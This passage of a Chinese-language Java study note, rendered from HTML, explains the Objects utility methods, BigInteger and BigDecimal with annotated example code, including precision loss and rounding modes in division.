class_">Student</span>(<span class="string">&quot;itheima&quot;</span> , <span class="string">&quot;14&quot;</span>) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用Objects类中的equals方法，比较两个对象是否相等</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> Objects.equals(s1, s2);     <span class="comment">// 如果Student没有重写Object类中的equals方法，此处比较的还是对象的地址值</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出结果</span></span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试toString方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method_01</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个学生对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;itheima&quot;</span> , <span class="string">&quot;14&quot;</span>) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用Objects中的toString方法,获取s1对象的字符串表现形式</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> Objects.toString(s1);       <span class="comment">// 如果Student没有重写Object类中的toString方法，此处还是返回的对象的地址值</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出结果</span></span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="案例2：演示需要了解的方法"><a class="header-anchor" href="#案例2：演示需要了解的方法">¶</a>案例2：演示需要了解的方法</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectsDemo02</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        method_03();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示requireNonNullElseGet</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method_03</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个学生对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;itheima&quot;</span> , <span class="string">&quot;14&quot;</span>) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用Objects对象的requireNonNullElseGet方法,该方法的第二个参数是Supplier类型的，查看源码我们发现Supplier是一个函数式接口,</span></span><br><span class="line">        <span class="comment">// 那么我们就可以为其传递一个Lambda表达式，而在Supplier接口中所定义的方法是无参有返回值的方法，因此具体调用所传入的Lambda表达式如下所示</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> Objects.requireNonNullElseGet(s1, () -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;itcast&quot;</span>, <span class="string">&quot;14&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出</span></span><br><span class="line">        System.out.println(student);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示requireNonNullElse</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method_02</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个学生对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;itheima&quot;</span> , <span class="string">&quot;14&quot;</span>) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用Objects对象的requireNonNullElse方法</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> Objects.requireNonNullElse(s1, <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;itcast&quot;</span>, <span class="string">&quot;14&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出</span></span><br><span class="line">        System.out.println(student);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示requireNonNull</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method_01</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个学生对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;itheima&quot;</span> , <span class="string">&quot;14&quot;</span>) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用Objects对象的requireNonNull方法</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> Objects.requireNonNull(s1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出</span></span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>不是很明白喵= =</li>
</ul>
<h3 id="BigInteger类"><a class="header-anchor" href="#BigInteger类">¶</a>BigInteger类</h3>
<ul>
<li>存储整数的时候，Java中默认是int类型，int类型有取值范围：-2147483648 ~ 2147483647</li>
<li>如果数字过大，我们可以使用long类型，但当long类型也表示不下↓</li>
<li>用BigInteger</li>
<li>可以理解为：大的整数。有多大呢？理论上最大到42亿的21亿次方，基本上在内存撑爆之前，都无法达到这个上限</li>
</ul>
<h4 id="常见方法-v6"><a class="header-anchor" href="#常见方法-v6">¶</a>常见方法</h4>
<h5 id="构造方法-v3"><a class="header-anchor" href="#构造方法-v3">¶</a>构造方法</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BigInteger</span><span class="params">(<span class="type">int</span> num, Random rnd)</span><span class="comment">//获取随机大整数，范围：[0 ~ 2的num次方-1]</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BigInteger</span><span class="params">(String val)</span>         <span class="comment">//获取指定的大整数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BigInteger</span><span class="params">(String val, <span class="type">int</span> radix)</span>  <span class="comment">//获取指定进制的大整数</span></span><br><span class="line">    </span><br><span class="line">下面这个不是构造，而是一个静态方法获取BigInteger对象</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> BigInteger <span class="title function_">valueOf</span><span class="params">(<span class="type">long</span> val)</span> <span class="comment">//静态方法获取BigInteger的对象，内部有优化</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>构造方法小结：</strong>
<ul>
<li>如果BigInteger表示的数字没有超出long的范围，可以用静态方法获取。</li>
<li>如果BigInteger表示的超出long的范围，可以用构造方法获取。</li>
<li>对象一旦创建，BigInteger内部记录的值不能发生改变。</li>
<li>只要进行计算都会产生一个新的BigInteger对象</li>
</ul>
</li>
</ul>
<h5 id="常见成员方法"><a class="header-anchor" href="#常见成员方法">¶</a>常见成员方法</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> BigInteger <span class="title function_">add</span><span class="params">(BigInteger val)</span>                   <span class="comment">//加法</span></span><br><span class="line"><span class="keyword">public</span> BigInteger <span class="title function_">subtract</span><span class="params">(BigInteger val)</span>              <span class="comment">//减法</span></span><br><span class="line"><span class="keyword">public</span> BigInteger <span class="title function_">multiply</span><span class="params">(BigInteger val)</span>              <span class="comment">//乘法</span></span><br><span class="line"><span class="keyword">public</span> BigInteger <span class="title function_">divide</span><span class="params">(BigInteger val)</span>                <span class="comment">//除法</span></span><br><span class="line"><span class="keyword">public</span> BigInteger[] divideAndRemainder(BigInteger val)  <span class="comment">//除法，获取商和余数</span></span><br><span class="line"><span class="keyword">public</span>  <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object x)</span>                        <span class="comment">//比较是否相同</span></span><br><span class="line"><span class="keyword">public</span>  BigInteger <span class="title function_">pow</span><span class="params">(<span class="type">int</span> exponent)</span>                    <span class="comment">//次幂、次方</span></span><br><span class="line"><span class="keyword">public</span>  BigInteger max/min(BigInteger val)              <span class="comment">//返回较大值/较小值</span></span><br><span class="line"><span class="keyword">public</span>  <span class="type">int</span> <span class="title function_">intValue</span><span class="params">(BigInteger val)</span>        <span class="comment">//转为int类型整数，超出范围数据有误</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.a06bigintegerdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BigIntegerDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* public BigInteger(int num, Random rnd) 获取随机大整数，范围:[0~ 2的num次方-1]  →?</span></span><br><span class="line"><span class="comment">            public BigInteger(String val) 获取指定的大整数</span></span><br><span class="line"><span class="comment">            public BigInteger(String val, int radix) 获取指定进制的大整数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            public static BigInteger valueOf(long val) 静态方法获取BigInteger的对象，内部有优化</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            细节:</span></span><br><span class="line"><span class="comment">            对象一旦创建里面的数据不能发生改变。*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取一个随机的大整数</span></span><br><span class="line">        <span class="comment">/* Random r=new Random();</span></span><br><span class="line"><span class="comment">            for (int i = e; i &lt; 100; i++) &#123;</span></span><br><span class="line"><span class="comment">            BigInteger bd1 = new BigInteger(4,r);</span></span><br><span class="line"><span class="comment">            System.out.println(bd1);//[@ ~ 15]&#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.获取一个指定的大整数，可以超出long的取值范围</span></span><br><span class="line">        <span class="comment">//细节:字符串中必须是整数，否则会报错</span></span><br><span class="line">        <span class="comment">/* BigInteger bd2 = new BigInteger(&quot;1.1&quot;);</span></span><br><span class="line"><span class="comment">            System.out.println(bd2);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            BigInteger bd3 = new BigInteger(&quot;abc&quot;);</span></span><br><span class="line"><span class="comment">            System.out.println(bd3);</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.获取指定进制的大整数</span></span><br><span class="line">        <span class="comment">//细节:</span></span><br><span class="line">        <span class="comment">//1.字符串中的数字必须是整数</span></span><br><span class="line">        <span class="comment">//2.字符串中的数字必须要跟进制吻合。</span></span><br><span class="line">        <span class="comment">//比如二进制中，那么只能写0和1，写其他的就报错。</span></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bd4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;123&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        System.out.println(bd4);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.静态方法获取BigInteger的对象，内部有优化</span></span><br><span class="line">        <span class="comment">//细节:</span></span><br><span class="line">        <span class="comment">//1.能表示范围比较小，只能在long的取值范围之内，如果超出long的范围就不行了。</span></span><br><span class="line">        <span class="comment">//2.在内部对常用的数字: -16 ~ 16 进行了优化。</span></span><br><span class="line">        <span class="comment">//  提前把-16~16 先创建好BigInteger的对象，如果多次获取不会重新创建新的。</span></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bd5</span> <span class="operator">=</span> BigInteger.valueOf(<span class="number">16</span>);</span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bd6</span> <span class="operator">=</span> BigInteger.valueOf(<span class="number">16</span>);</span><br><span class="line">        System.out.println(bd5 == bd6);<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bd7</span> <span class="operator">=</span> BigInteger.valueOf(<span class="number">17</span>);</span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bd8</span> <span class="operator">=</span> BigInteger.valueOf(<span class="number">17</span>);</span><br><span class="line">        System.out.println(bd7 == bd8);<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.对象一旦创建内部的数据不能发生改变</span></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bd9</span> <span class="operator">=</span>BigInteger.valueOf(<span class="number">1</span>);</span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bd10</span> <span class="operator">=</span>BigInteger.valueOf(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//此时，不会修改参与计算的BigInteger对象中的借，而是产生了一个新的BigInteger对象记录</span></span><br><span class="line">        BigInteger result=bd9.add(bd10);</span><br><span class="line">        System.out.println(result);<span class="comment">//3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.a06bigintegerdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BigIntegerDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            public BigInteger add(BigInteger val) 加法</span></span><br><span class="line"><span class="comment">            public BigInteger subtract(BigInteger val) 减法</span></span><br><span class="line"><span class="comment">            public BigInteger multiply(BigInteger val) 乘法</span></span><br><span class="line"><span class="comment">            public BigInteger divide(BigInteger val) 除法，获取商</span></span><br><span class="line"><span class="comment">            public BigInteger[] divideAndRemainder(BigInteger val) 除法，获取商和余数</span></span><br><span class="line"><span class="comment">            public boolean equals(Object x) 比较是否相同</span></span><br><span class="line"><span class="comment">            public BigInteger pow(int exponent) 次幂</span></span><br><span class="line"><span class="comment">            public BigInteger max/min(BigInteger val) 返回较大值/较小值</span></span><br><span class="line"><span class="comment">            public int intValue(BigInteger val) 转为int类型整数，超出范围数据有误</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.创建两个BigInteger对象</span></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bd1</span> <span class="operator">=</span> BigInteger.valueOf(<span class="number">10</span>);</span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bd2</span> <span class="operator">=</span> BigInteger.valueOf(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.加法</span></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bd3</span> <span class="operator">=</span> bd1.add(bd2);</span><br><span class="line">        System.out.println(bd3);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.除法，获取商和余数</span></span><br><span class="line">        BigInteger[] arr = bd1.divideAndRemainder(bd2);</span><br><span class="line">        System.out.println(arr[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(arr[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.比较是否相同</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> bd1.equals(bd2);</span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.次幂</span></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bd4</span> <span class="operator">=</span> bd1.pow(<span class="number">2</span>);</span><br><span class="line">        System.out.println(bd4);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6.max</span></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bd5</span> <span class="operator">=</span> bd1.max(bd2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//7.转为int类型整数，超出范围数据有误</span></span><br><span class="line">        <span class="comment">/* BigInteger bd6 = BigInteger.valueOf(2147483647L);</span></span><br><span class="line"><span class="comment">         int i = bd6.intValue();</span></span><br><span class="line"><span class="comment">         System.out.println(i);</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bd6</span> <span class="operator">=</span> BigInteger.valueOf(<span class="number">200</span>);</span><br><span class="line">        <span class="type">double</span> <span class="variable">v</span> <span class="operator">=</span> bd6.doubleValue();</span><br><span class="line">        System.out.println(v);<span class="comment">//200.0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="底层存储方式"><a class="header-anchor" href="#底层存储方式">¶</a>底层存储方式</h4>
<ul>
<li>对于计算机而言，其实是没有数据类型的概念的，都是0101010101，数据类型是编程语言自己规定的，所以在实际存储的时候，先把具体的数字变成二进制，每32个bit为一组，存储在数组中。
<ul>
<li>数组中最多能存储元素个数：21亿多</li>
<li>数组中每一位能表示的数字：42亿多</li>
</ul>
</li>
<li>理论上，BigInteger能表示的最大数字为：42亿的21亿次方。但是还没到这个数字，电脑的内存就会撑爆，所以一般认为BigInteger是无限的。</li>
</ul>
<h3 id="BigDecimal类"><a class="header-anchor" href="#BigDecimal类">¶</a>BigDecimal类</h3>
<h4 id="引入"><a class="header-anchor" href="#引入">¶</a>引入</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BigDecimalDemo01</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">0.09</span> + <span class="number">0.01</span>);  <span class="comment">// 0.09999999999999999</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>一个丢失精度的结果</li>
<li>使用<strong>float或者double类型</strong>的数据在进行数学运算的时候，很有可能会产生精度丢失问题</li>
</ul>
<h4 id="精度丢失问题"><a class="header-anchor" href="#精度丢失问题">¶</a>精度丢失问题</h4>
<ul>
<li>计算机<strong>底层</strong>在进行<strong>运算</strong>的时候，使用的都是<strong>二进制</strong>数据；</li>
<li>当我们在程序中写了一个十进制数据 ，在进行运算的时候，计算机会将这个<strong>十进制数据转换成二进制数据</strong>，然后再进行<strong>运算</strong>，计算完毕以后计算机会把运算的结果再转换成十进制数据给我们展示；</li>
<li>如果我们使用的是<strong>整数类型</strong>的数据进行计算，那么在把十进制数据转换成二进制数据的时候<strong>不会存在精度问题</strong>；</li>
<li>如果我们的数据是一个<strong>浮点类型</strong>的数据，有的时候计算机并不会将这个数据完全转换成一个二进制数据，而是将这个将其<strong>转换成一个无限的趋近于这个十进数的二进制数据</strong>；</li>
<li>这样使用一个不太准确的数据进行运算的时候， 最终就会造成精度丢失；</li>
<li>为了<strong>提高精度</strong>，Java就给我们提供了<strong>BigDecimal</strong>供我们进行数据运算</li>
</ul>
<h4 id="概述-v3"><a class="header-anchor" href="#概述-v3">¶</a>概述</h4>
<ul>
<li>BigDecimal所在包是在<u>java.math</u>包下，因此在使用的时候就需要进行导包</li>
<li>可以使用BigDecimal类进行<u>更加精准的数据计算</u></li>
</ul>
<h4 id="常见方法-v7"><a class="header-anchor" href="#常见方法-v7">¶</a>常见方法</h4>
<h4 id="构造方法-v4"><a class="header-anchor" href="#构造方法-v4">¶</a>构造方法</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal(<span class="type">int</span> val)  <span class="comment">// 将int转换为BigDecimal</span></span><br><span class="line">BigDecimal(<span class="type">long</span> val)  <span class="comment">// 将long转换为BigDecimal</span></span><br><span class="line">BigDecimal(String val)  <span class="comment">// 将BigDecimal的字符串表示形式转换为BigDecimal</span></span><br></pre></td></tr></table></figure>
<h4 id="常见成员方法-v2"><a class="header-anchor" href="#常见成员方法-v2">¶</a>常见成员方法</h4>
<ul>
<li>使用最多的还是提供的进行<strong>四则运算</strong>的方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> BigDecimal <span class="title function_">add</span><span class="params">(BigDecimal value)</span>       <span class="comment">// 加法运算</span></span><br><span class="line"><span class="keyword">public</span> BigDecimal <span class="title function_">subtract</span><span class="params">(BigDecimal value)</span>  <span class="comment">// 减法运算</span></span><br><span class="line"><span class="keyword">public</span> BigDecimal <span class="title function_">multiply</span><span class="params">(BigDecimal value)</span>  <span class="comment">// 乘法运算</span></span><br><span class="line"><span class="keyword">public</span> BigDecimal <span class="title function_">divide</span><span class="params">(BigDecimal value)</span>    <span class="comment">// 触发运算</span></span><br></pre></td></tr></table></figure>
<h5 id="案例1：基本四则运算"><a class="header-anchor" href="#案例1：基本四则运算">¶</a>案例1：基本四则运算</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BigDecimalDemo01</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建两个BigDecimal对象</span></span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;0.3&quot;</span>) ;</span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;4&quot;</span>) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用方法进行b1和b2的四则运算，并将其运算结果在控制台进行输出</span></span><br><span class="line">        System.out.println(b1.add(b2));         <span class="comment">// 进行加法运算  4.3        </span></span><br><span class="line">        System.out.println(b1.subtract(b2));    <span class="comment">// 进行减法运算  -3.7</span></span><br><span class="line">        System.out.println(b1.multiply(b2));    <span class="comment">// 进行乘法运算  1.2</span></span><br><span class="line">        System.out.println(b1.divide(b2));      <span class="comment">// 进行除法运算  0.075</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="案例2：除法的特殊情况"><a class="header-anchor" href="#案例2：除法的特殊情况">¶</a>案例2：除法的特殊情况</h5>
<ul>
<li>如果使用BigDecimal类型的数据进行除法运算的时候，得到的结果是一个无限循环小数，那么就会报错：ArithmeticException</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BigDecimalDemo02</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建两个BigDecimal对象</span></span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1&quot;</span>) ;</span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;3&quot;</span>) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用方法进行b1和b2的除法运算，并且将计算结果在控制台进行输出</span></span><br><span class="line">        System.out.println(b1.divide(b2));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行程序进行测试，控制台输出：</span></span><br><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.ArithmeticException: Non-terminating decimal expansion; no exact representable decimal result.</span><br><span class="line">        at java.base/java.math.BigDecimal.divide(BigDecimal.java:<span class="number">1716</span>)</span><br><span class="line">        at com.itheima.api.bigdecimal.demo02.BigDecimalDemo02.main(BigDecimalDemo02.java:<span class="number">14</span>)</span><br></pre></td></tr></table></figure>
<h6 id="除法特殊情况的解决"><a class="header-anchor" href="#除法特殊情况的解决">¶</a>除法特殊情况的解决</h6>
<ul>
<li>需要使用到BigDecimal类中另外一个divide方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal <span class="title function_">divide</span><span class="params">(BigDecimal divisor, <span class="type">int</span> scale, <span class="type">int</span> roundingMode)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>上述divide方法参数说明：</li>
</ul>
<blockquote>
<p>divisor:                        除数对应的BigDecimal对象；</p>
<p>scale:                           精确的位数；</p>
<p>roundingMode:           取舍模式；</p>
<p>取舍模式被封装到了RoundingMode这个枚举类中（关于枚举我们后期再做重点讲解），在这个枚举类中定义了很多种取舍方式。最常见的取舍方式有如下几个：</p>
<p>UP(直接进1) ， FLOOR(直接删除) ， HALF_UP(4舍五入)，我们可以通过如下格式直接访问这些取舍模式：枚举类名.变量名</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BigDecimalDemo02</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        method_03() ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示取舍模式HALF_UP</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method_03</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建两个BigDecimal对象</span></span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;0.3&quot;</span>) ;</span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;4&quot;</span>) ;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 0.3 / 4 的准确值是 0.075</span></span><br><span class="line">        <span class="comment">// 使用HALF_UP舍入模式时，如果需要舍入的数字是5，则向最接近的数字舍入；如果两边一样近，则向上舍入</span></span><br><span class="line">        <span class="comment">// 因此，0.075保留两位小数后会变成0.08</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用方法进行b1和b2的除法运算，并且将计算结果在控制台进行输出</span></span><br><span class="line">        System.out.println(b1.divide(b2 , <span class="number">2</span> , RoundingMode.HALF_UP));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示取舍模式FLOOR</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method_02</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建两个BigDecimal对象</span></span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1&quot;</span>) ;</span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;3&quot;</span>) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用方法进行b1和b2的除法运算，并且将计算结果在控制台进行输出</span></span><br><span class="line">        System.out.println(b1.divide(b2 , <span class="number">2</span> , RoundingMode.FLOOR));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1 / 3 的准确值是 0.333...</span></span><br><span class="line">        <span class="comment">// 使用FLOOR舍入模式时，总是向下舍入到最接近的数字</span></span><br><span class="line">        <span class="comment">// 因此，0.333...保留两位小数后会变成0.33</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示取舍模式UP</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method_01</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建两个BigDecimal对象</span></span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1&quot;</span>) ;</span><br><span class="line">        <span class="type">BigDecimal</span> <span 